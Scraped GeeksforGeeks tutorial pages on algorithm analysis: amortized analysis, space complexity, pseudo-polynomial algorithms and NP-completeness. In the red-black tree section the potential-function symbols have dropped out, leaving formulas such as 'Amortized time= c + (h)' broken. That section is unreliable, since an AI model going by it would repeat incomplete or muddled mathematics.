Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Complexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple Examples Analysis of Algorithm | Set 5 (Amortized Analysis Introduction) Last Updated: 24-04-2020 Amortized Analysis is used for algorithms where an occasional operation is very slow, but most of the other operations are faster. In Amortized Analysis, we analyze a sequence of operations and guarantee a worst case average time which is lower than the worst case time of a particular expensive operation. The example data structures whose operations are analyzed using Amortized Analysis are Hash Tables, Disjoint Sets and Splay Trees. Let us consider an example of a simple hash table insertions. How do we decide table size? There is a trade-off between space and time, if we make hash-table size big, search time becomes fast, but space required becomes high. The solution to this trade-off problem is to use Dynamic Table (or Arrays). The idea is to increase size of table whenever it becomes full. Following are the steps to follow when table becomes full. 1) Allocate memory for a larger table of size, typically twice the old table. 2) Copy the contents of old table to new table. 3) Free the old table. If the table has space available, we simply insert new item in available space. What is the time complexity of n insertions using the above scheme? If we use simple analysis, the worst case cost of an insertion is O(n). Therefore, worst case cost of n inserts is n * O(n) which is O(n2). This analysis gives an upper bound, but not a tight upper bound for n insertions as all insertions don’t take Θ(n) time. So using Amortized Analysis, we could prove that the Dynamic Table scheme has O(1) insertion time which is a great result used in hashing. Also, the concept of dynamic table is used in vectors in C++, ArrayList in Java. Following are few important notes. 1) Amortized cost of a sequence of operations can be seen as expenses of a salaried person. The average monthly expense of the person is less than or equal to the salary, but the person can spend more money in a particular month by buying a car or something. In other months, he or she saves money for the expensive month. 2) The above Amortized Analysis done for Dynamic Array example is called Aggregate Method. There are two more powerful ways to do Amortized analysis called Accounting Method and Potential Method. We will be discussing the other two methods in separate posts. 3) The amortized analysis doesn’t involve probability. There is also another different notion of average-case running time where algorithms use randomization to make them faster and expected running time is faster than the worst-case running time. These algorithms are analyzed using Randomized Analysis. Examples of these algorithms are Randomized Quick Sort, Quick Select and Hashing. We will soon be covering Randomized analysis in a different post. Amortized analysis of insertion in Red-Black Tree Let us discuss the Amortized Analysis of Red-Black Tree operations (Insertion) using Potential Method. To perform the amortized analysis of Red-Black Tree Insertion operation, we use Potential(or Physicist’s) method. For potential method, we define a potential function that maps a data structure to a non-negative real value. An operation can result in a change of this potential. Let us define the potential function in the following manner: (1) where n is a node of Red-Black Tree Potential function = ,over all nodes of the red black tree. Further, we define the amortized time of an operation as: Amortized time= c + (h) (h)= (h’) – (h) where h and h’ are the states of Red-Black Tree before and after the operation respectively c is the actual cost of the operation The change in potential should be positive for low-cost operations and negative for high-cost operations. A new node is inserted on a leaf of a red-black tree. We have the leaves of a red-black tree of any one of the following types: The insertions and their amortized analysis can be represented as: (1) This insertion is performed by first recolouring the parent and the other sibling(red). Then the grandparent and uncle of that leaf node is considered for further recolouring which leads to the amortized cost to be -1(when grandparent of the leaf node is red), -2 (when uncle of the leaf is black and grandparent is black) or +1 (when uncle of the leaf is red and grandparent is black). The insertion can be shown as: (2) In this insertion, the node is inserted without any changes as the black depth of the leaves remain the same. This is the case when leaf may have a black sibling or do not have any sibling (since we consider the colour of the colour of null node to be black). So, the amortized cost of this insertion is 0. (3) In this insertion, we cannot recolour the leaf node, its parent and the sibling such that the black depth stays the same as before. So, we need to perform a Left- Left rotation. After rotation, there are no changes when the grandparent of g(the inserted node) is black. Also, for the case of Red Grandparent of g(the inserted node), we do not have any changes. So, the insertion is completed with amortized cost= +2. The insertion has been depicted below: After calculating these particular amortized costs at the leaf site of a red-black tree we can discuss the nature of total amortized cost of insertion in a red-black tree. Since this may happen that two red nodes may have a parent-child relationship till the root of the red-black tree. So in extreme(or corner) case, we reduce the number of black nodes with two red children by 1 and we at most increase the number of black nodes with no red children by 1, leaving a net loss of at most 1 to the potential function. Since one unit of potential pays for each operation therefore (h) n where n is total number of nodes Thus, the total amortized cost of insertion in Red-Black Tree is O(n). For any doubts regarding insertions in red black tree, you may refer Insertions in Red-Black Tree. Sources: Berkeley Lecture 35: Amortized Analysis MIT Lecture 13: Amortized Algorithms, Table Doubling, Potential Method http://www.cs.cornell.edu/courses/cs3110/2011sp/lectures/lec20-amortized/amortized.htm http://web.iitd.ac.in/~csz188551/COL106_2019/ Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Amortized analysis for increment in counterAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsPractice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Complexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisAlgorithm Practice Question for Beginners | Set 1NP-Completeness | Set 1 (Introduction)Improved By : ashwinikumar43215 Article Tags : Analysis thumb_up 37 To-do Done 2.6 Based on 119 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Tail Recursion Next last_page Algorithm Practice Question for Beginners | Set 1 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemComplexity Analysis of Binary SearchPractice Questions on Time Complexity AnalysisTime complexity of recursive Fibonacci program More related articles in Analysis Analysis of different sorting techniquesCyclomatic ComplexityProof that traveling salesman problem is NP HardAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of Algorithms | Big-O analysis room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

What does 'Space Complexity' mean? - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Understanding Time Complexity with Simple ExamplesComplexity of different operations in Binary tree, Binary Search Tree and AVL tree What does ‘Space Complexity’ mean? Last Updated: 30-10-2015 Space Complexity: The term Space Complexity is misused for Auxiliary Space at many places. Following are the correct definitions of Auxiliary Space and Space Complexity. Auxiliary Space is the extra space or temporary space used by an algorithm. Space Complexity of an algorithm is total space taken by the algorithm with respect to the input size. Space complexity includes both Auxiliary space and space used by input. For example, if we want to compare standard sorting algorithms on the basis of space, then Auxiliary Space would be a better criteria than Space Complexity. Merge Sort uses O(n) auxiliary space, Insertion sort and Heap Sort use O(1) auxiliary space. Space complexity of all these sorting algorithms is O(n) though. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Examples of Big-O analysisThe Slowest Sorting AlgorithmsSubset Sum is NP CompleteTime-Space Trade-Off in AlgorithmsOptimized Longest Path is NP CompleteProof that 4 SAT is NP completeProof that Collinearity Problem is NP CompleteSubset Equality is NP CompleteProof that SAT is NP CompleteDouble SAT is NP CompleteHitting Set problem is NP CompleteSet cover is NP Complete3-coloring is NP CompleteSet partition is NP complete Article Tags : Analysis thumb_up 66 To-do Done 1.5 Based on 170 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Time Complexity of building a heap Next last_page A Time Complexity Question Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary SearchCyclomatic Complexity More related articles in Analysis Analysis of Algorithms | Set 5 (Practice Problems)Analysis of different sorting techniquesProof that SAT is NP CompleteTime complexity of recursive Fibonacci programAnalysis of Algorithms | Big-O analysis room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Pseudo-polynomial Algorithms - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops) Pseudo-polynomial Algorithms Last Updated: 23-10-2019 What is Pseudo-polynomial? An algorithm whose worst case time complexity depends on numeric value of input (not number of inputs) is called Pseudo-polynomial algorithm. For example, consider the problem of counting frequencies of all elements in an array of positive numbers. A pseudo-polynomial time solution for this is to first find the maximum value, then iterate from 1 to maximum value and for each value, find its frequency in array. This solution requires time according to maximum value in input array, therefore pseudo-polynomial. On the other hand, an algorithm whose time complexity is only based on number of elements in array (not value) is considered as polynomial time algorithm. Pseudo-polynomial and NP-Completeness Some NP-Complete problems have Pseudo Polynomial time solutions. For example, Dynamic Programming Solutions of 0-1 Knapsack, Subset-Sum and Partition problems are Pseudo-Polynomial. NP complete problems that can be solved using a pseudo-polynomial time algorithms are called weakly NP-complete. Reference: https://en.wikipedia.org/wiki/Pseudo-polynomial_time This article is contributed by Dheeraj Gupta. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 4 (Analysis of Loops)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of algorithms | little o and little omega notationsLoop Invariant Condition with Examples of Sorting AlgorithmsAnalysis of Algorithms | Big-O analysisAlgorithms | Recurrences | Set 1Difference between Deterministic and Non-deterministic AlgorithmsAlgorithms Sample Questions | Recurrences | Set 2Algorithms Sample Questions | Set 3 | Time Order AnalysisSorting Algorithms Visualization : Bubble SortTime-Space Trade-Off in AlgorithmsAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)The Slowest Sorting AlgorithmsAnalysis of Algorithms | Set 3 (Asymptotic Notations) Article Tags : Analysisknapsack thumb_up 16 To-do Done 2.3 Based on 81 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Time Complexity where loop variable is incremented by 1, 2, 3, 4 .. Next last_page Time Complexity of a Loop when Loop variable “Expands or Shrinks” exponentially Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Complexity of different operations in Binary tree, Binary Search Tree and AVL treeProof that Clique Decision problem is NP-Complete | Set 2Understanding Time Complexity with Simple ExamplesDifference between NP hard and NP complete problemPractice Questions on Time Complexity Analysis More related articles in Analysis Complexity Analysis of Binary SearchCyclomatic ComplexityAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of different sorting techniquesProof that SAT is NP Complete room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

NP-Completeness | Set 1 (Introduction) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops) NP-Completeness | Set 1 (Introduction) Last Updated: 07-09-2018 We have been writing about efficient algorithms to solve complex problems, like shortest path, Euler graph, minimum spanning tree, etc. Those were all success stories of algorithm designers. In this post, failure stories of computer science are discussed. Can all computational problems be solved by a computer? There are computational problems that can not be solved by algorithms even with unlimited time. For example Turing Halting problem (Given a program and an input, whether the program will eventually halt when run with that input, or will run forever). Alan Turing proved that general algorithm to solve the halting problem for all possible program-input pairs cannot exist. A key part of the proof is, Turing machine was used as a mathematical definition of a computer and program (Source Halting Problem). Status of NP Complete problems is another failure story, NP complete problems are problems whose status is unknown. No polynomial time algorithm has yet been discovered for any NP complete problem, nor has anybody yet been able to prove that no polynomial-time algorithm exist for any of them. The interesting part is, if any one of the NP complete problems can be solved in polynomial time, then all of them can be solved. What are NP, P, NP-complete and NP-Hard problems? P is set of problems that can be solved by a deterministic Turing machine in Polynomial time. NP is set of decision problems that can be solved by a Non-deterministic Turing Machine in Polynomial time. P is subset of NP (any problem that can be solved by deterministic machine in polynomial time can also be solved by non-deterministic machine in polynomial time). Informally, NP is set of decision problems which can be solved by a polynomial time via a “Lucky Algorithm”, a magical algorithm that always makes a right guess among the given set of choices (Source Ref 1). NP-complete problems are the hardest problems in NP set. A decision problem L is NP-complete if: 1) L is in NP (Any given solution for NP-complete problems can be verified quickly, but there is no efficient known solution). 2) Every problem in NP is reducible to L in polynomial time (Reduction is defined below). A problem is NP-Hard if it follows property 2 mentioned above, doesn’t need to follow property 1. Therefore, NP-Complete set is also a subset of NP-Hard set. Decision vs Optimization Problems NP-completeness applies to the realm of decision problems. It was set up this way because it’s easier to compare the difficulty of decision problems than that of optimization problems. In reality, though, being able to solve a decision problem in polynomial time will often permit us to solve the corresponding optimization problem in polynomial time (using a polynomial number of calls to the decision problem). So, discussing the difficulty of decision problems is often really equivalent to discussing the difficulty of optimization problems. (Source Ref 2). For example, consider the vertex cover problem (Given a graph, find out the minimum sized vertex set that covers all edges). It is an optimization problem. Corresponding decision problem is, given undirected graph G and k, is there a vertex cover of size k? What is Reduction? Let L1 and L2 be two decision problems. Suppose algorithm A2 solves L2. That is, if y is an input for L2 then algorithm A2 will answer Yes or No depending upon whether y belongs to L2 or not. The idea is to find a transformation from L1 to L2 so that the algorithm A2 can be part of an algorithm A1 to solve L1. Learning reduction in general is very important. For example, if we have library functions to solve certain problem and if we can reduce a new problem to one of the solved problems, we save a lot of time. Consider the example of a problem where we have to find minimum product path in a given directed graph where product of path is multiplication of weights of edges along the path. If we have code for Dijkstra’s algorithm to find shortest path, we can take log of all weights and use Dijkstra’s algorithm to find the minimum product path rather than writing a fresh code for this new problem. How to prove that a given problem is NP complete? From the definition of NP-complete, it appears impossible to prove that a problem L is NP-Complete. By definition, it requires us to that show every problem in NP is polynomial time reducible to L. Fortunately, there is an alternate way to prove it. The idea is to take a known NP-Complete problem and reduce it to L. If polynomial time reduction is possible, we can prove that L is NP-Complete by transitivity of reduction (If a NP-Complete problem is reducible to L in polynomial time, then all problems are reducible to L in polynomial time). What was the first problem proved as NP-Complete? There must be some first NP-Complete problem proved by definition of NP-Complete problems. SAT (Boolean satisfiability problem) is the first NP-Complete problem proved by Cook (See CLRS book for proof). It is always useful to know about NP-Completeness even for engineers. Suppose you are asked to write an efficient algorithm to solve an extremely important problem for your company. After a lot of thinking, you can only come up exponential time approach which is impractical. If you don’t know about NP-Completeness, you can only say that I could not come with an efficient algorithm. If you know about NP-Completeness and prove that the problem as NP-complete, you can proudly say that the polynomial time solution is unlikely to exist. If there is a polynomial time solution possible, then that solution solves a big problem of computer science many scientists have been trying for years. We will soon be discussing more NP-Complete problems and their proof for NP-Completeness. References: MIT Video Lecture on Computational Complexity Introduction to Algorithms 3rd Edition by Clifford Stein, Thomas H. Cormen, Charles E. Leiserson, Ronald L. Rivest http://www.ics.uci.edu/~eppstein/161/960312.html Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Image Splicing | Set 1 (Introduction)Introduction to Blockchain technology | Set 2Transportation Problem | Set 1 (Introduction)Vertex Cover Problem | Set 1 (Introduction and Approximate Algorithm)Introduction to Microsoft Azure | A cloud computing serviceIntroduction to Programming LanguagesDHTML | IntroductionIntroduction to RSS(Rich Summary Site)Introduction to NodeJSIntroduction to ES6Introduction and Installation of GitIntroduction to Model View View Model (MVVM)Introduction to Project Lombok in Java and How to get started?Introduction to Factor AnalyticsSet Cover Problem | Set 1 (Greedy Approximate Algorithm)Travelling Salesman Problem | Set 1 (Naive and Dynamic Programming)Travelling Salesman Problem | Set 2 (Approximate using MST)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 4 (Analysis of Loops) Article Tags : AnalysisArticlesNPHard thumb_up 51 To-do Done 4.1 Based on 154 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Reservoir Sampling Next last_page Analysis of Algorithms | Set 3 (Asymptotic Notations) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Complexity of different operations in Binary tree, Binary Search Tree and AVL treeProof that Clique Decision problem is NP-Complete | Set 2Understanding Time Complexity with Simple ExamplesDifference between NP hard and NP complete problemPractice Questions on Time Complexity Analysis Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

A Time Complexity Question - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueAnalysis of Algorithms | Set 1 